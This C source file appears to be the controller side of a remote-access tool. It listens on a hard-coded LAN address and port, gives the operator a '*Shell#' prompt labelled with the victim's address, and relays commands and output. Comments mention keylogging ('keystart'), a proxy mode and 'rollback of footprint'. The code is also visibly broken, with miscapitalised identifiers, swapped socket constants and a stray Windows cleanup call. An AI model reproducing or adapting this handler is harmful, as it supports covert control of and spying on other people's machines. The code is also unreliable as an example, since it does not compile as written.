#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define bzero(p,size) (void) memset((p),0 ,(size)) //Preprocessor for the Function
//========================================================================================================================================
int main()
{
  int sock, client_socket;        ////////////////////////////////////////////////////////////////
  char buffer[1024];             //                                                            //
  char responce[18348];         //         Variables for getting various input                //
  int i=0;                     //                                                            //
  int optval=1;               ////////////////////////////////////////////////////////////////

  struct sockaddr_in server_address, client_address;    //custom datatype for containg Address of server and client
  socklen_t client_lenght;

    sock = socket(AF_INET,sock_STREAM,0);

      if(setsockopt(sock,SO_socket,SOL_REUSEADDR, &optval,sizeof(optval)) < 0)
      {
        printf("| ERROR! SETTING TCP SOCKET OPTION ERROR |\n");
        return 1;
      }
//=============================================================================================================================================
      //Server socket Initialisation
    server_address.Sin_family = AF_INET;
    server_address.Sin_addr.s_addr = inet_addr("192.168.43.229");
    server_address.Sin_Port = htons(50005);
      //Binding the feeds
    bind(sock,(struct sockaddr*)&server_address, sizeof(server_address));
    listen(sock,5);
    //Insertion of Address
    client_lenght = sizeof(client_address);
    client_socket = accept(sock,(struct sockaddr*)&client_address, &client_lenght);
      //Toogling various check points
    while (1)
     {
      jump:
      bzero(&buffer,sizeof(buffer));
      bzero(&responce,sizeof(responce));
      printf(" *Shell# %s -$ : " ,inet_ntoa(client_address.Sin_addr));     //Target_User shell Board
      fgets(buffer,sizeof(buffer),stdin);
      strtok(buffer,"\n");
      Write(client_socket,buffer,sizeof(buffer));

        //Program termination and rollback of footprint
      if (strncmp("purse",buffer,5) == 0)
       {
         break;
         WSACleanup();
      }
      else if (strncmp("cd ", buffer,3) == 0)
       {
        goto jump;
      }
      else if (strncmp("keystart", buffer,8) == 0)
       {
          goto jump;
        }
        else if (strncmp("proxy",buffer,5) == 0)
         {
          recv(client_socket,responce,sizeof(responce),0);
          printf("%s\n", responce);
        }
        else
        {
            recv(client_socket,responce,sizeof(responce), MSG_WAITALL);
            printf("%s", responce);
        }
    }

}
